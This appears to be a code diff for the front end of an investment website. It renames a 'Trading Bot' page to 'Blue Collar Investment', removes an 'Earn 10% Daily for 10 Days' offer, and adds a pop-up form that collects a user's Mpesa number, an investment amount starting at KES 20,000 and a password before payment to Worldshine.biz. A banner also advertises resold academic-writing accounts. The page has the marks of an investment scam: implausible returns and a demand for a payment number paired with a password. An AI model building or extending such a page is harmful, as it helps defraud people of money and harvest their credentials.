@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trading Bot </title>
+    <title>Blue Collar Investment </title>
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 
@@ -37,20 +37,30 @@
             <h2>Hello, Alicia</h2>
             <p><b>Offer Moto Moto !!!!! Guess what giving out writing account for only academic account 7k from 13k and article account 5k from 10k</b></p>
         </section>
-        <div class="flex-container">
+       
          
-    
-            <!-- Right section: Partnership Box -->
-            <section class="partnership-box">
-                <img src="gross investment.PNG" alt="Trading Bot Image"> <!-- Image in partnership box -->
-                <div class="partnership-details">
-                    
-                    <h2>KES 1,000-10,000</h2>
-                    <p><b>Earn 10% Daily for 10 Days</b></p>
-                    <br>
-                    <button>Invest</button>
+     <!-- Investment Modal -->
+     <div id="investmentModal" class="modal">
+        <div class="modal-content">
+            <h2>Blue Collar Investment Bundle Box</h2>
+            <form>
+                <label for="mpesa">Mpesa Number</label>
+                <input type="text" id="mpesa" name="mpesa">
+                
+                <label for="amount">Amount to Invest [KES 20,000 - Any Amount]</label>
+                <input type="number" id="amount" name="amount">
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password">
+                
+                <div class="modal-buttons">
+                    <button type="button" class="cancel-btn">Cancel</button>
+                    <button type="submit" class="proceed-btn">Proceed to Pay</button>
                 </div>
-            </section>
+                <p>By clicking Proceed to Pay you will be prompted to pay to Worldshine.biz to complete your order.</p>
+            </form>
+        </div>
+    
             
         </div>
     
@@ -157,69 +167,6 @@ body {
     margin-bottom: 20px;
 }
 /* Flex container to hold both the image box and the partnership box */
-.flex-container {
-    display: flex;
-    justify-content: space-between;
-    align-items: center; /* Ensure both sections align in the middle */
-    gap: 20px; /* Space between the two sections */
-}
-/* Horizontal Line Styling */
-.partnership-details hr {
-    border: none;
-    border-top: 2px solid black;
-    width: 100%; /* Adjust the width as needed */
-    margin: 10px auto;
-}
-
-/* Partnership box layout using flexbox */
-.partnership-box {
-    display: flex;
-    flex-direction: column; /* Stack content vertically */
-    align-items: center; /* Center items horizontally */
-    justify-content: flex-start; /* Align items to the top */
-    background-color: #FFF5EE;
-    text-align: center;
-    padding: auto;
-    border-radius: 10px;
-    width: 50%;
-    max-width: 500px;
-    margin: auto; 
-   
-    
-}
-
-.partnership-details h2 {
-    font-size: 35px;
-}
-
-.partnership-details p {
-    margin-bottom: 14px; /* Adds space between paragraphs */
-}
-
-.partnership-details b p {
-    margin-bottom: 15px; /* Adds space between bold paragraphs */
-}
-.partnership-box button {
-    background-color: #000;
-    color: #fff;
-    padding: 10px 20px;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    margin-bottom: auto;
-    font-size: 20px;
-
-}
-/* Style for the image inside the partnership box */
-.partnership-box img {
-    width: 100%; /* Adjust width to control image size */
-    height: auto; /* Maintain aspect ratio */
-    border-radius: 10px;
-    margin-top: 9px; /* Leave space from the top */
-    margin-bottom: 20px; /* Add space below the image */
-    margin-left: 20px;
-    margin-right: 8px;
-}
 
 
 .bundle-box table {
@@ -279,6 +226,70 @@ body {
     background-color: #444; /* Darken the background on hover */
     border-radius: 5px;
     padding-left: 10px;
+}
+/* Modal Styling */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed;
+    z-index: 100; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0, 0, 0, 0.5); /* Black background with opacity */
+}
+
+.modal-content {
+    background-color: white;
+    margin: 10% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 40%;
+    border-radius: 8px;
+    text-align: center;
+}
+
+.modal-content form label {
+    display: block;
+    margin: 15px 0 5px 0;
+}
+
+.modal-content form input {
+    width: 90%;
+    padding: 10px;
+    margin: 5px 0 15px 0;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+}
+
+.modal-buttons {
+    display: flex;
+    justify-content: space-between;
+}
+
+.cancel-btn, .proceed-btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin: 10px;
+    font-size: 18px;
+}
+
+.cancel-btn {
+    background-color: #000;
+    color: #fff;
+}
+
+.proceed-btn {
+    background-color: green;
+    color: #fff;
+}
+
+/* Display modal when open */
+.show {
+    display: block;
 }
 
 /* Responsive design for smaller screens */
